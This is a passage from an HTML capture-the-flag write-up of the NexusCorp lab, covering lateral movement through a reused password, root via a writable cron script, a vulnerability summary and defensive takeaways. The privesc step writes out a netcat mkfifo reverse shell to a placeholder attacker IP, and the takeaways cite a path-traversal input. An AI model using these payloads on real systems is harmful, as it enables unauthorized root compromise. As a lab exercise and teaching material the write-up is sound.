+    <p>But first, a simpler path. <code>/opt/admin_bot.py</code> is world-readable and has permissions <code>rwxrwxrwx</code>. Inside it, the DB password is hardcoded. Remember the <code>system_user</code> from the encrypted config back in Step 2? <code>devops</code>.</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — on the target</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+su devops
+Password: $PASS
+<span class="cg">devops@nexus:~$</span></code></pre>
+
+    <p>DB password reused as the system account password. Lateral movement complete in one command. SSH in properly for a stable session:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ssh devops@10.49.131.163
+<span class="ck"># password: $PASS</span>
+
+cat ~/user.txt</code></pre>
+
+    <div class="callout green"><strong>Flag 4 captured.</strong></div>
+
+    <div class="callout yellow"><strong>How this chain connected:</strong> The encrypted config gave us the username (<code>devops</code>). The file API gave us the DB password. The world-readable <code>admin_bot.py</code> confirmed the password was reused on the OS account. Three separate pieces of information, assembled over 5 steps, clicked together in one <code>su</code> command.</div>
+  </section>
+
+  <!-- 07 PRIVESC -->
+  <section class="section" id="privesc">
+    <div class="s-num">07</div>
+    <h2>Cron PrivEsc → Root</h2>
+
+    <p>We already spotted the root cron job with <code>pspy64</code>. As <code>devops</code>, let's check the permissions on that script:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+ls -la /opt/monitoring/health_report.sh
+
+<span class="cy">-rwxrwxr-- root devops /opt/monitoring/health_report.sh</span></code></pre>
+
+    <p><code>devops</code> has write access. Root cron executes it every minute as UID 0. This is as textbook as it gets:</p>
+
+    <pre><code><div class="ph"><span class="pl">shell — privesc</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+echo <span class="cs">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc &lt;ATTACKER_IP&gt; 9999 >/tmp/f'</span> \
+  > /opt/monitoring/health_report.sh</code></pre>
+
+    <pre><code><div class="ph"><span class="pl">shell — attack machine</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+nc -lvnp 9999</code></pre>
+
+    <p>Wait one minute. Cron fires. Shell drops.</p>
+
+    <pre><code><div class="ph"><span class="pl">root shell</span><div class="pd"><span style="background:#ff5f57"></span><span style="background:#ffbd2e"></span><span style="background:#28ca41"></span></div></div>
+# id
+<span class="cg">uid=0(root) gid=0(root) groups=0(root)</span>
+
+# cat /root/root.txt
+<span class="cg">THM{...}</span></code></pre>
+
+    <div class="callout green"><strong>Flag 5 captured. Root.</strong></div>
+
+    <div class="callout red"><strong>Why this works:</strong> The cron daemon runs the script as root (UID 0) because the crontab entry has no user restriction. Writing our reverse shell payload into the script means root executes our code on the next tick. Fix: cron scripts that run as root must not be writable by non-root users — <code>chmod 750</code> with <code>root:root</code> ownership, or better, move them to <code>/etc/cron.d/</code> and review all permissions on the scripts they call.</div>
+  </section>
+
+  <!-- 08 VULN SUMMARY -->
+  <section class="section" id="vulns">
+    <div class="s-num">08</div>
+    <h2>Vulnerability Chain</h2>
+
+    <div class="steps">
+      <div class="step"><div class="sn">V1</div><div class="sb"><strong>Hardcoded AES key in frontend JS.</strong> <code>/static/app.js</code> — key readable by any browser. Decrypted the backup config, leaked <code>system_user: devops</code>.</div></div>
+      <div class="step"><div class="sn">V2</div><div class="sb"><strong>Weak password.</strong> <code>robert.wilson</code> — Hydra broke it in seconds against rockyou. Gave us an authenticated session to start cookie analysis.</div></div>
+      <div class="step"><div class="sn">V3</div><div class="sb"><strong>Forged session cookie.</strong> <code>APP_SECRET</code> was readable via the file API. HMAC session tokens are only as secure as the secrecy of the signing key.</div></div>
+      <div class="step"><div class="sn">V4</div><div class="sb"><strong>JWT signature verification disabled.</strong> <code>auth.php</code> had the check commented out. The server accepted any token where the header and payload decoded correctly — signature was never verified.</div></div>
+      <div class="step"><div class="sn">V5</div><div class="sb"><strong>Unrestricted file read via JWT-authenticated API.</strong> <code>files.php?name=</code> with no path restriction — readable any file on the server. Exposed the full <code>config.php</code>.</div></div>
+      <div class="step"><div class="sn">V6</div><div class="sb"><strong>Remote File Inclusion + eval().</strong> <code>files.php</code> fetched attacker-controlled URLs and passed the content to <code>eval()</code>. Full RCE as <code>www-data</code>.</div></div>
+      <div class="step"><div class="sn">V7</div><div class="sb"><strong>Password reuse.</strong> DB password reused on the <code>devops</code> OS account. One <code>su</code> command for lateral movement.</div></div>
+      <div class="step"><div class="sn">V8</div><div class="sb"><strong>World-writable root cron script.</strong> <code>health_report.sh</code> writable by the <code>devops</code> group. Root executes it on a 1-minute tick. Instant privilege escalation.</div></div>
+    </div>
+  </section>
+
+  <!-- 09 TAKEAWAYS -->
+  <section class="section" id="takeaways">
+    <div class="s-num">09</div>
+    <h2>Key Takeaways</h2>
+
+    <div class="steps">
+      <div class="step"><div class="sn">01</div><div class="sb"><strong>Never put secrets in frontend JavaScript.</strong> Not even as a TODO. The comment said "move to env before prod deployment." It is prod. It was never moved. A single JS file started the chain that ended at root.</div></div>
+      <div class="step"><div class="sn">02</div><div class="sb"><strong>Signature verification exists for a reason.</strong> Commenting out <code>hash_equals($parts[2], $expected)</code> turns JWT from "cryptographically verified identity" into "base64-encoded wishful thinking." If you disable a security check in code, the attacker doesn't know — they just get in.</div></div>
+      <div class="step"><div class="sn">03</div><div class="sb"><strong>File-reading APIs need path restriction.</strong> <code>files.php?name=../../etc/passwd</code> is a solved problem — use <code>realpath()</code>, validate against an allowed directory, and never construct filesystem paths from raw user input.</div></div>
+      <div class="step"><div class="sn">04</div><div class="sb"><strong>eval() on remote content is never acceptable.</strong> The RFI vector in <code>files.php</code> is the kind of code that should trigger an immediate PR rejection. If you need to include remote configuration, parse JSON. Do not execute arbitrary code fetched from a user-supplied URL.</div></div>
+      <div class="step"><div class="sn">05</div><div class="sb"><strong>Password reuse across DB and system accounts multiplies the blast radius.</strong> One leaked DB password gave us an SSH shell. Rotate credentials independently — the DB account and the OS user should never share a password.</div></div>
+      <div class="step"><div class="sn">06</div><div class="sb"><strong>Root cron scripts must not be writable by non-root users.</strong> Audit permissions with <code>find /etc/cron* /opt -type f -perm -o+w</code> or any script called by a root cron. If a non-privileged user can write to it, they own root.</div></div>
+      <div class="step"><div class="sn">07</div><div class="sb"><strong>One bad TODO comment → full root compromise.</strong> Laura's note from October 22, 2024 started a chain that ended with a root reverse shell. Treat TODOs in production code like open bug reports — triage them, or don't ship them.</div></div>
+    </div>
+
+    <div class="callout blue"><em>"NexusCorp's security posture: a house of dominoes in a wind tunnel."</em></div>
+  </section>
+
+</main>
+
+<aside class="toc">
+  <div class="toc-label">Contents</div>
+  <ul>
+    <li><a href="#killchain">00 — Kill Chain</a></li>
+    <li><a href="#recon">01 — Recon</a></li>
+    <li><a href="#aes">02 — JS Leak &amp; AES</a></li>
+    <li><a href="#sessionforge">03 — Session Forge</a></li>
+    <li><a href="#jwt">04 — JWT Forgery</a></li>
+    <li><a href="#rce">05 — RFI / RCE</a></li>
+    <li><a href="#lateral">06 — Lateral Move</a></li>
+    <li><a href="#privesc">07 — Cron PrivEsc</a></li>
+    <li><a href="#vulns">08 — Vuln Summary</a></li>
+    <li><a href="#takeaways">09 — Takeaways</a></li>
+  </ul>
+</aside>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span class="footer-copy">© 2025 CyberMaks</span>
+    <div class="footer-links">
+      <a href="../index.html">Home</a>
+      <a href="../methodology.html">Methodology</a>
+      <a href="../about.html">About</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
